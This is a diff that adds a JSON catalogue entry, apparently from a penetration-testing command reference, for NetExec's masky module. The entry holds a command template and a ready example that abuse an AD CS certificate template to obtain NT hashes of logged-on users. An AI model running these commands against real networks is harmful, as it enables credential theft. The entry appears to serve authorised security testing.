@@ -1,0 +1,16 @@
+{
+  "id": "nxc-masky",
+  "name": "NetExec masky Module",
+  "command": "nxc smb <target> -u '<user>' -p '<password>' -M masky -o CA='<ca-fqdn>\\\\<ca-name>'",
+  "description": "Remotely abuse a vulnerable certificate template (typically User) to enroll certificates as every interactively-logged-on user on the target host, then convert each cert to its NT hash. Requires local admin and a valid AD CS template.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["smb"],
+  "tags": ["netexec", "nxc", "masky", "adcs", "user-credentials"],
+  "references": [
+    { "title": "Masky", "url": "https://github.com/Z4kSec/Masky" }
+  ],
+  "examples": [
+    "nxc smb 10.10.10.10 -u administrator -p 'Password123!' -M masky -o CA='ca.corp.local\\\\CORP-CA'"
+  ]
+}
